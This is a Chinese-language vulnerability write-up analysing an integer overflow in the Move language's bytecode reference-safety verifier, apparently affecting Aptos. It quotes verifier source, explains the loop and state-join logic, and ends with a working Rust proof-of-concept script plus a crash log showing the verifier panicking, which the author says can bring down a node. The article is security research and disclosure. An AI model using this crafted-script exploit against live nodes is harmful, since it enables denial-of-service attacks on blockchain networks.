## 0x0前言

之前我们发现了一个Aptos Moveevm()的严重漏洞，经过深入研究，我们发现了另外一个新的整数溢出漏洞,这次一的漏洞触发过程相对更有趣一点，
下面是对这个漏洞的深入分析过程，里面包含了很多Move语言本身的背景知识.通过本文讲解相信你会对move语言有更深入的理解。

众所周知，Move语言在执行字节码之前会验证代码单元。验证代码单元的过程，分为4步。这个漏洞就出现在reference_safety的步骤中。

    
    
    fn verify_common(&self) -> PartialVMResult<()> { 
            StackUsageVerifier::verify(&self.resolver, &self.function_view)?; 
            type_safety::verify(&self.resolver, &self.function_view)?; 
            locals_safety::verify(&self.resolver, &self.function_view)?; 
            reference_safety::verify(&self.resolver, &self.function_view, &self.name_def_map) 
        }

如上面代码所示，此模块定义了用于验证过程主体的引用安全性的转移函数。其检查包括（但不限于）验证没有悬空引用、对可变引用的访问是否安全、对全局存储引用的访问是否安全。

下面是引用安全验证入口函数，它将调用analyze_function.

> pub(crate) fnverify<'a>(  
> resolver:&'aBinaryIndexedView<'a>,  
> function_view:&FunctionView,  
> name_def_map:&'aHashMap<IdentifierIndex,FunctionDefinitionIndex>,  
> ) ->PartialVMResult<()>{  
> letinitial_state=AbstractState::new(function_view);  
> letmutverifier
> =ReferenceSafetyAnalysis::new(resolver,function_view,name_def_map);  
> verifier.analyze_function(initial_state,function_view)  
> }

在analyze_function中，函数将对每一个基本块进行验证，那么什么是基本块呢？

在代码编译领域，基本块是一个代码序列，除了入口之外没有分支指令，除了出口之外没有分支指令。

### Move语言是如何识别基本块？

在Move语言中，基本块是通过遍历字节码、查找所有分支指令以及循环指令序列来确定的。以下是核心代码：

    
    
    // Create basic blocks 
            let mut blocks = Map::new(); 
            let mut entry = 0; 
            let mut exit_to_entry = Map::new(); 
            for pc in 0..code.len() { 
                let co_pc = pc as CodeOffset; 
     
                // Create a basic block 
                if Self::is_end_of_block(co_pc, code, █_ids) { 
                    let exit = co_pc; 
                    exit_to_entry.insert(exit, entry); 
                    let successors = Bytecode::get_successors(co_pc, code); 
                    let bb = BasicBlock { exit, successors }; 
                    blocks.insert(entry, bb); 
                    entry = co_pc + 1; 
                } 
            } 
     
    fn is_end_of_block(pc: CodeOffset, code: &[Bytecode], block_ids: &Set<BlockId>) -> bool { 
            pc + 1 == (code.len() as CodeOffset) || block_ids.contains(&(pc + 1)) 
        } 
        fn record_block_ids(pc: CodeOffset, code: &[Bytecode], block_ids: &mut Set<BlockId>) { 
            let bytecode = &code[pc as usize]; 
     
            if let Some(offset) = bytecode.offset() { 
                block_ids.insert(*offset); 
            } 
     
            if bytecode.is_branch() && pc + 1 < (code.len() as CodeOffset) { 
                block_ids.insert(pc + 1); 
            } 
        } 

接下来，我们来分享一个moveir代码基本块的例子,如下所示，它3个基本块。分别由分支指令：BrTrue，Branch，Ret确定。

    
    
    main() { 
    L0:	loc0: u64 
    B0: 
    	0: LdU64(42) 
    	1: LdU64(0) 
    	2: Gt 
    	3: BrTrue(7) 
    B1: 
    	4: LdU64(2) 
    	5: StLoc[0](loc0: u64) 
    	6: Branch(9) 
    B2: 
    	7: LdU64(1) 
    	8: StLoc[0](loc0: u64) 
    B3: 
    	9: Ret 
    } 
    } 

## 0x1 Move 中的参考安全性

参考Rust语言的思想，Move支持两种类型的引用类型。不可变引用&（例如&T）和可变引用&mut（例如&mutT）。你可以使用不可变（&）引用从结构中读取数据，使用可变（&mut）引用修改它们。通过使用恰当的引用类型，有助于维护安全性以及识别读取模块。这样可以让读者清晰地知道此方法是更改值还是仅读取。下面是官方Move教程中的示例：

    
    
    script { 
        use {{sender}}::M; 
     
        fun main() { 
            let t = M::create(10); 
     
            // create a reference directly 
            M::change(&mut t, 20); 
     
            // or write reference to a variable 
            let mut_ref_t = &mut t; 
     
            M::change(mut_ref_t, 100); 
     
            // same with immutable ref 
            let value = M::value(&t); 
     
            // this method also takes only references 
            // printed value will be 100 
            0x1::Debug::print<u8>(&value); 
        } 
    } 

在示例中，我们可以看到mut_ref_t是t 的可变引用。

所以在Move 引用安全模块中，尝试通过以函数为单元，扫描函数中的基本块中的字节码指令验证判断所有引用操作是否合法。

下图显示了验证引用安全性的主要流程。

![1669115937_637cb0213b2c9f3aff0bf.png!small?1669115941610](https://image.3001.net/images/20221122/1669115937_637cb0213b2c9f3aff0bf.png!small?1669115941610)

这里的state是AbstractState结构体，它包含了borrow graph和locals，他们共同用于确保引用函数中的引用安全性。

    
    
    pub(crate) struct AbstractState { 
        current_function: Option<FunctionDefinitionIndex>, 
        locals: BTreeMap<LocalIndex, AbstractValue>, 
        borrow_graph: BorrowGraph, 
        num_locals: usize, 
        next_id: usize, 

这里borrowgraph是用来表示局部变量引用之间关系的图。

从上图中可以看到，这里有一个prestate，其包含locals和borrow graph (L
,BG)。然后执行了basicblock生成一个poststate(L’,
BG’)。然后将前后的state合并以更新块状态并将该块的后置条件传播到后续块。这就像V8turbofan中的[SeaofNodes](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/)思想。

下面的代码是上图对应的主循环。首先，
执行块代码（如果执行指令不成功，将返回AnalysisError）然后尝试通过join_result是否更改，来合并prestate和poststate。如果更改并且当前块本身包含一个后向的边指向自己（这意味着有一个循环）将跳回到循环的开头，在下一轮循环仍将执行此基本块，直到poststate等于prestate或因某些错误而中止。

    
    
    let post_state = self.execute_block(block_id, pre_state, function_view)?; 
                let mut next_block_candidate = function_view.cfg().next_block(block_id); 
                // propagate postcondition of this block to successor blocks 
                for successor_block_id in function_view.cfg().successors(block_id) { 
                    match inv_map.get_mut(successor_block_id) { 
                        Some(next_block_invariant) => { 
                            let join_result = { 
                                let old_pre = &mut next_block_invariant.pre; 
                                old_pre.join(&post_state) 
                            }; 
                            match join_result { 
                                JoinResult::Unchanged => { 
                                    // Pre is the same after join. Reanalyzing this block would produce 
                                    // the same post 
                                } 
                                JoinResult::Changed => { 
                                    // If the cur->successor is a back edge, jump back to the beginning 
                                    // of the loop, instead of the normal next block 
                                    if function_view 
                                        .cfg() 
                                        .is_back_edge(block_id, *successor_block_id) 
                                    { 
                                        next_block_candidate = Some(*successor_block_id); 
                                    } 
                                } 
                            } 
                        } 

因此在引用安全模块，如何判断join的结果是否改变？

    
    
    fn join(&mut self, state: &AbstractState) -> JoinResult { 
            let joined = Self::join_(self, state); 
            assert!(joined.is_canonical()); 
            assert!(self.num_locals == joined.num_locals); 
            let locals_unchanged = self 
                .iter_locals() 
                .all(|idx| self.locals.get(&idx) == joined.locals.get(&idx)); 
            let borrow_graph_unchanged = self.borrow_graph.leq(&joined.borrow_graph); 
            if locals_unchanged && borrow_graph_unchanged { 
                JoinResult::Unchanged 
            } else { 
                *self = joined; 
                JoinResult::Changed 
            } 
        } 

通过上面的代码，我们可以通过判断locals和borrow关系是否发生变化来判断join结果是否发生变化。 这里的join_
函数用于更新本地变量和borrow关系图 。

下面是join_ 函数代码，第6 行是初始化一个新的locals Map 对象。 第 9 行迭代locals 中的所有索引，如果prestate与 post
state都值为None，则不要插入到新的locals 映射中，如果pre state 有值，post state为None,则需要释放brow_graph
id ,意味着这里消除该值的借用关系, 反之亦然。特别的，当prestate与 post state
两个值都存在且相同时，像第30-33行一样将它们插入到新的map中，然后在第38行合并borrow graph。

    
    
    pub fn join_(&self, other: &Self) -> Self { 
            assert!(self.current_function == other.current_function); 
            assert!(self.is_canonical() && other.is_canonical()); 
            assert!(self.next_id == other.next_id); 
            assert!(self.num_locals == other.num_locals); 
            let mut locals = BTreeMap::new(); 
            let mut self_graph = self.borrow_graph.clone(); 
            let mut other_graph = other.borrow_graph.clone(); 
            for local in self.iter_locals() { 
                let self_value = self.locals.get(&local); 
                let other_value = other.locals.get(&local); 
                match (self_value, other_value) { 
                    // Unavailable on both sides, nothing to add 
                    (None, None) => (), 
     
                    (Some(v), None) => { 
                        // A reference exists on one side, but not the other. Release 
                        if let AbstractValue::Reference(id) = v { 
                            self_graph.release(*id); 
                        } 
                    } 
                    (None, Some(v)) => { 
                        // A reference exists on one side, but not the other. Release 
                        if let AbstractValue::Reference(id) = v { 
                            other_graph.release(*id); 
                        } 
                    } 
     
                    // The local has a value on each side, add it to the state 
                    (Some(v1), Some(v2)) => { 
                        assert!(v1 == v2); 
                        assert!(!locals.contains_key(&local)); 
                        locals.insert(local, *v1); 
                    } 
                } 
            } 
     
            let borrow_graph = self_graph.join(&other_graph); 
            let current_function = self.current_function; 
            let next_id = self.next_id; 
            let num_locals = self.num_locals; 
     
            Self { 
                current_function, 
                locals, 
                borrow_graph, 
                num_locals, 
                next_id, 
            } 
        } 
    } 

通过上面代码，我们可以看到self.iter_locals() 是locals变量的个数。 请注意，此局部变量不仅包括函数的真实局部变量，还包括参数。

## 0x2 漏洞

在这里我们已经覆盖了所有与漏洞相关的代码，你找到漏洞了吗？

如果你没有发现漏洞也没关系，下面我会详细说明漏洞触发过程。

首先在下面的代码中，如果参数长度添加局部长度大于256。这似乎没有问题？

    
    
    let num_locals = function_view.parameters().len() + function_view.locals().len(); 
    
    But this function will return Iterator with the inem type is u8. 
    
        fn iter_locals(&self) -> impl Iterator<Item = LocalIndex> { 
            0..self.num_locals as LocalIndex 
        } 

当函数join_() 中是function_view.parameters().len() 和 function_view.locals().len()
组合值大于256，由于语句 for local in self.iter_locals()中 local 是 u8类型，此时执行此语句对造成溢出。

实际上Move有校验locals个数的过程，可惜在checkbounds模块只校验locals，并没有不包括参数length。

开发者似乎只检查了Move Modules代码中的 locals+parameter长度，而忽略了script。

![1669116699_637cb31b15edf585d896d.png!small?1669116703759](https://image.3001.net/images/20221122/1669116699_637cb31b15edf585d896d.png!small?1669116703759)

## 0x3 Move overflow to DoS

通过上面的介绍，我们知道有一个主循环来扫描代码块，然后调用execute_block函数，之后会合并执行前后的state，当move代码中存在循环，则会跳转到代码块开始，再次执行基本块。
因此，如果我们制造一个循环代码块并利用溢出改变块的state，使AbstractState对象中的新的localsmap与之前不同，当再次执行execute_block函数时，在分析basicblock中字节码指令序列的时候会访问新的localsmap，这时候如果指令中需要访问的索引在新的AbstractStatelocals
map中不存在，将导致DoS。

![1669116819_637cb393874672111fd68.png!small?1669116824007](https://image.3001.net/images/20221122/1669116819_637cb393874672111fd68.png!small?1669116824007)

在审核代码后，我发现在reference safety模块中，MoveLoc/CopyLoc/FreeRef 操作码，我们可以实现这个目标。

这里让我们看一下文件路径中execute_block函数调用的copy_loc函数作为一个说明：

move/language/move-bytecode-verifier/src/reference_safety/abstract_state.rs

![1669116860_637cb3bca9e1117fef126.png!small?1669116865176](https://image.3001.net/images/20221122/1669116860_637cb3bca9e1117fef126.png!small?1669116865176)

在第287行，代码尝试通过LocalIndex作为参数获取本地值，如果LocalIndex不存在会导致panic，想象一下当节点执行满足上述条件代码的时候，会导致整个节点崩溃。

## 0x4 PoC

下面是你可以在git里面重现的PoC：

commit:add615b64390ea36e377e2a575f8cb91c9466844

    
    
    fn PoC(){
      
         let sigs = (0..132)
        .map(|_|  Reference(Box::new(U64)))
        .collect::<Vec<_>>();
        let script = CompiledScript {
        version:5,
        module_handles:vec![],   
        struct_handles:vec![],
        function_handles:vec![],
        function_instantiations:vec![],
       signatures: vec![Signature(sigs)],
        identifiers:vec![],
        address_identifiers:vec![],
        constant_pool:vec![],
        metadata:vec![
            Metadata {
                key:vec! [],
                value: vec![],
            },
        ],
        code: CodeUnit {
            locals: SignatureIndex(0),
            code: vec![CopyLoc(57), StLoc(57), CopyLoc(57), StLoc(41), Branch(0)],
        },
        type_parameters:vec![],
        parameters:SignatureIndex(0),
    
    
    
    };
    let res=crate::verify_script(&script);
    }
    

### **这是崩溃日志：**

thread 'regression_tests::reference_analysis::PoC' panicked at 'called
`Option::unwrap()` on a `None` value', language/move-bytecode-verifier/src/reference_safety/abstract_state.rs:287:39  
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

### DoS的触发步骤:

我们可以看到PoC中代码块存在一个basicblock，分支指令是一个无条件分支指令，每次执行最后一条指令时，branch(0)
将跳回第一条指令，因此这个代码块将多次调用execute_block和 join 函数。

1.在第一次执行完execute_block 函数，当这里设置parameters
为SignatureIndex(0)，locals为SignatureIndex(0)会导致num_locals为132*2=264。
所以在执行join_函数下面这行代码之后

2.在第二次执行execute_block函数时，执行move代码第一条指令copyloc(57)，57是locals需要压入栈的offset，但是这次locals只有长度8，offset
57不存在，所以会导致 get(57).unwrap() 函数返回none ，最后导致panic。

## 0x5 总结

以上就是这个漏洞的来龙去脉。首先这个漏洞说明没有绝对安全的代码，Move语言在代码执行之前确实做了很好的静态校验，但是就像这个漏洞一样，可以通过溢出漏洞完全绕过之前的边界校验。再者代码审计很重要，程序员难免会疏忽。作为Move语言安全研究的领导者，我们将继续深挖Move的安全问题。第三点，对于Move语言，我们建议语言设计者在move运行时增加更多的检查代码，以防止意外情况的发生。目前move语言主要是在verify阶段进行一系列的安全检查，但我觉得这还不够，一旦验证被绕过，运行阶段没有过多的安全加固，将导致危害进一步加深，引发更严重的问题。最后，我们还发现了Move语言的另一个漏洞，后续会继续分享给大家。

##  **0x6** **参考资料**

  * <https://github.com/move-language/move>
  * <https://github.com/MystenLabs/awesome-move>
  * <https://move-language.github.io/move/>

